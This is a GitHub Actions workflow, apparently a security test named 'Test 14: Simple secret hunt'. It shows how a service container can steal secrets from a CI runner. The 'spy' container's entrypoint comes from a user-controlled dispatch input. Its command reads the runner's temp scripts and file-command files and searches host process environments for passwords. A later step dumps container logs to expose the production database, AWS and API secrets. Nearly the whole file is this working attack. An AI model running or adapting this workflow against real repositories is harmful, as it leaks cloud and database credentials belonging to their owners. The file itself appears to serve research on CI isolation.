name: "Test 14: Simple secret hunt"
on:
  workflow_dispatch:
    inputs:
      entrypoint:
        description: "Entrypoint"
        default: "/bin/sh"
env:
  PRODUCTION_DB_PASSWORD: ${{ secrets.PRODUCTION_DB_PASSWORD }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
  INTERNAL_API_TOKEN: ${{ secrets.INTERNAL_API_TOKEN }}
jobs:
  victim:
    runs-on: ubuntu-latest
    services:
      spy:
        image: alpine:3.19
        entrypoint: ${{ github.event.inputs.entrypoint }}
        command: -c "echo === SECRET HUNT ===; echo --- temp files ---; ls -la /host/home/runner/work/_temp/ 2>&1; echo --- sh files ---; cat /host/home/runner/work/_temp/*.sh 2>&1; echo --- file commands ---; ls /host/home/runner/work/_temp/_runner_file_commands/ 2>&1; cat /host/home/runner/work/_temp/_runner_file_commands/* 2>&1; echo --- proc env search ---; grep -r PASSWORD /host/proc/1/environ 2>&1 | tr '\0' '\n' | head -5; grep -rla PASSWORD /host/proc/*/environ 2>/dev/null | head -5; echo --- all env from matching procs ---; cat /host/proc/self/environ 2>&1 | tr '\0' '\n'; echo === DONE ===; sleep 90"
    steps:
      - name: Use secrets normally
        run: |
          echo "DB: ${PRODUCTION_DB_PASSWORD:0:3}*** (masked)"
          echo "Deploying..."

      - name: Wait
        run: sleep 20

      - name: Spy results
        run: |
          for CID in $(docker ps -aq); do
            echo "=== SPY CONTAINER RESULTS ==="
            docker logs "$CID" 2>&1
          done
